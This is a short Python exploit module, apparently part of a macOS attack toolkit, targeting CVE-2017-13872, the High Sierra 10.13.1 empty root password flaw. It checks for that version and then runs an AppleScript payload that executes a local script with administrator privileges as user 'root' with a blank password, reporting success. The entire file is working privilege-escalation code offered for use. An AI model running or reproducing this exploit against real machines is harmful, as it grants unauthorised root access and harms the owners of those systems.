import os
from distutils.version import LooseVersion

from .applescript import osascript

__cve__ = "2017-13872"
__credits__ = "lemiorhan"


def vulnerable(version):
    return version == LooseVersion("10.13.1")


def run():
    command = "python " + os.getcwd() + "/run_as_sudo.py"
    payload = """osascript -e 'do shell script "{command}; echo success" user name "root" password "" with administrator privileges'""".format(
        command=command)
    response = osascript(payload)
    return "success" in response
